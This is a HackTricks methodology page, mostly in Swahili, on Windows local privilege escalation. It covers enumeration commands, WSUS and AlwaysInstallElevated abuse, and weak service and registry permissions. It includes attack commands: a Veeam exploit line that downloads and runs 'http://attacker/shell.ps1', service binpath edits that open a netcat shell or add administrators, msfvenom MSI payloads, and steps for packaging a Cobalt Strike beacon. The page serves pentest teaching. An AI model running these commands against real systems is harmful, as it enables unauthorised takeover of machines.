# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna mambo tofauti katika Windows ambayo yanaweza **kukuzuia kuenumerate mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuenumerate** **mechanisms** hizi zote za **defenses** kabla ya kuanza privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes zilizozinduliwa kupitia `RAiLaunchAdminProcess` zinaweza kutumiwa vibaya ili kufikia High IL bila prompts wakati AppInfo secure-path checks zimepitwa. Angalia UIAccess/Admin Protection bypass workflow maalum hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation inaweza kutumiwa vibaya kwa arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Recent Windows builds pia zilianzisha njia ya LPE ya **SMB arbitrary-port** ambapo privileged local NTLM authentication inaakisiwa kupitia reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Angalia kama Windows version ina udhaifu wowote unaojulikana (angalia pia patches zilizotumika).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits za Version

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni msaada kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **shambulio kubwa sana** ambalo mazingira ya Windows yanatoa.

**Kwenye system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson imejengwa ndani)_

**Kwenye machine kwa kutumia taarifa za system**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Je, kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwasha hapa [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline yanarekodiwa, yakijumuisha amri zilizotekelezwa, uanzishaji wa amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output yanaweza yasionekane kabisa.

Ili kuiwasha, fuata maelekezo katika sehemu ya "Transcript files" ya documentation, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowersShell unaweza kuendesha:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hukamatwa, kuhakikisha kwamba kila block ya code inarekodiwa inapoendeshwa. Mchakato huu huhifadhi audit trail ya kina ya kila shughuli, muhimu kwa forensics na kuchambua tabia mbaya. Kwa kuandika kila shughuli wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya logging kwa Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Hifadhi za diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuathiri mfumo ikiwa masasisho hayaombwi kwa kutumia http**S** bali http.

Unaanza kwa kuangalia kama mtandao unatumia WSUS update isiyo ya SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au kwa ifuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ukikubali jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumiwa vibaya.** Ikiwa registry ya mwisho ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Ili kutumia vibaya vulnerabilities hivi unaweza kutumia tools kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni MiTM weaponized exploits scripts za kuingiza 'fake' updates kwenye non-SSL WSUS traffic.

Soma research hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma report kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, huu ndio flaw ambayo bug hii inatumia:

> Ikiwa tuna uwezo wa kubadilisha local user proxy yetu, na Windows Updates hutumia proxy iliyosanidiwa kwenye Internet Explorer’s settings, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) locally ili ku-intercept traffic yetu wenyewe na ku-run code kama elevated user kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia settings za current user, pia itatumia certificate store yake. Tukizalisha self-signed certificate kwa ajili ya WSUS hostname na kuongeza certificate hii kwenye certificate store ya current user, tutaweza ku-intercept both HTTP and HTTPS WSUS traffic. WSUS haitumii HSTS-like mechanisms kutekeleza trust-on-first-use type validation kwenye certificate. Ikiwa certificate inayowasilishwa inaaminika na user na ina hostname sahihi, itakubaliwa na service.

Unaweza kutumia vulnerability hii kwa tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapokuwa liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa enterprise huweka wazi localhost IPC surface na privileged update channel. Ikiwa enrollment inaweza kulazimishwa kuelekea attacker server na updater inaamini rogue root CA au weak signer checks, local user anaweza kuwasilisha malicious MSI ambayo SYSTEM service hui-install. Angalia technique ya jumla (based on Netskope stAgentSvc chain – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` huweka wazi localhost service kwenye **TCP/9401** ambayo hushughulikia messages zinazodhibitiwa na attacker, na kuruhusu arbitrary commands kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory ileile, kisha trigger payload ya SYSTEM kupitia local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma hutekeleza amri kama SYSTEM.
## KrbRelayUp

Udhaifu wa **local privilege escalation** upo katika mazingira ya Windows **domain** chini ya hali fulani. Hali hizi ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kuwa mahitaji haya **requirements** yanatimizwa kwa kutumia **default settings**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** register hizi 2 zimewezeshwa (thamani ni **0x1**), basi watumiaji wa privilege yoyote wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una meterpreter session unaweza ku-automate technique hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya current directory Windows MSI binary ya kuongeza privileges. Script hii huandika MSI installer iliyokuwa tayari ime-compile ambayo huuliza kwa user/group addition (kwa hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper kwa kutumia tools hizi. Kumbuka kuwa unaweza ku-wrap faili "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Detectors

### Audit Settings

Mipangilio hii huamua nini kinaandikwa kwenye **log**, kwa hiyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua logi zinatumwa wapi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za local Administrator**, kuhakikisha kuwa kila nywila ni **ya kipekee, ya kubahatisha, na husasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa za kutosha kupitia ACLs, hivyo kuruhusu kuangalia local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa active, **plain-text passwords huhifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest katika ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia na **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika **kusoma kumbukumbu yake** au kudunga code, hivyo kuimarisha zaidi usalama wa mfumo.\
[**Taarifa zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Sifa Zilizohifadhiwa

**Sifa za domain** zinaidhinishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inapoidhinishwa na security package iliyosajiliwa, sifa za domain za mtumiaji huwekwa kwa kawaida.\
[**Maelezo zaidi kuhusu Cached Credentials hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Hesabu Watumiaji & Vikundi

Unapaswa kuangalia ikiwa yoyote ya vikundi ambavyo unamiliki vina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye haki maalum

Ikiwa **unamshiriki wa kikundi chenye haki maalum unaweza kuweza kuongeza haki**. Jifunze kuhusu vikundi vyenye haki maalum na jinsi ya kuvinyanyasa ili kuongeza haki hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Ubadilishaji wa tokeni

**Jifunze zaidi** kuhusu tokeni ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **kujifunza kuhusu tokeni za kuvutia** na jinsi ya kuzinyanyasa:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera la Nenopaswa la Nenosiri
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Inayoendelea

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **kagua kama kuna nywila ndani ya command line ya mchakato**.\
Kagua kama unaweza **kuandika juu ya baadhi ya binary inayoendelea** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendesha, unaweza kuitumia vibaya ili kuinua ruhusa](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binary za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa nenosiri kutoka kwenye memory

Unaweza kuunda memory dump ya process inayoendeshwa kwa kutumia **procdump** kutoka sysinternals. Services kama FTP zina **credentials katika clear text kwenye memory**, jaribu kudump memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

## Services

Service Triggers huiruhusu Windows kuanzisha service wakati hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kuwasili kwa device, GPO refresh, n.k.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha privileged services kwa kuamsha triggers zao. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma (`service`)
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe kwa XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unakutana na kosa hili (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwasha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Chukua kuzingatia kwamba huduma upnphost inategemea SSDPSRV kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kuzunguka** tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" linamiliki **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha executable binary ya service. Ili kurekebisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Haki zinaweza kuinuliwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huwezesha kusanidi upya binary ya service.
- **WRITE_DAC**: Huwezesha kusanidi upya ruhusa, na hivyo kupata uwezo wa kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kuchukua umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Huirithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Services binaries weak permissions

**Angalia kama unaweza kurekebisha binary inayotekelezwa na service** au kama una **ruhusa za kuandika kwenye folda** ambako binary hiyo iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (sio kwenye system32) na kuangalia ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kurekebisha registry ya services

Unapaswa kuangalia kama unaweza kurekebisha registry yoyote ya service.\
Unaweza **kuangalia** **ruhusa** zako juu ya **registry** ya service kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana `FullControl` permissions. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Beberapa kipengele cha Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenda kwenye funguo ya kikao cha HKLM. **Registry symbolic link race** inaweza kuelekeza uandishi huo wenye mamlaka kwenda kwenye **njia yoyote ya HKLM**, ikikupa primitive ya **arbitrary HKLM value write**.

Nafasi muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa logon/secure-desktop transitions na mtumiaji anaweza kuiandika.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha secure-desktop copy (mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock ikianza, badilisha funguo ya **HKLM Session ATConfig** iwe **registry link** kuelekea protected HKLM target.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenda kwenye njia ya HKLM iliyoelekezwa.

Ukishapata arbitrary HKLM value write, pitia kwenda LPE kwa ku-overwrite thamani za usanidi wa service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (mfano, **`msiserver`**) na i-trigger baada ya uandishi. **Kumbuka:** public exploit implementation **hufunga workstation** kama sehemu ya race.

Mfano wa tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Ruhusa za Services registry AppendData/AddSubdirectory

Ikiwa una ruhusa hii juu ya registry, hii ina maana kwamba **unaweza kuunda sub registries kutoka kwenye hii**. Katika hali ya Windows services, hii ni **ya kutosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haiko ndani ya quotes, Windows itajaribu kutekeleza kila sehemu ya mwisho kabla ya space.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
